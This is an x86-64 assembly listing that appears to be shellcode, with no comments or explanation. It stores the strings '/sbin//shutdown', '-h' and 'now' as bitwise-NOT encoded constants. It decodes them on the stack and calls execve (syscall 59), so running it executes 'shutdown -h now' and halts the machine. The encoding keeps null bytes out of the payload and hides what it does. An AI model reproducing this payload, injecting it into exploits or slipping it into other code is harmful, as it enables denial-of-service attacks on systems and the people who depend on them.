
section .text

global _start

_start:


mov rax, 0xff889091ffff97d2
not rax
push rax
lea rcx, [rsp+4]
mov rsi, rsp

mov rax, 0xff9188909b8b8a97
not rax
push rax
mov rax, 0x8cd0d091969d8cd0
not rax
push rax
mov rdi, rsp

cdq
push rdx
push rcx
push rsi
push rdi
lea rsi, [rsp]

mov eax, edx
mov al, 59
syscall

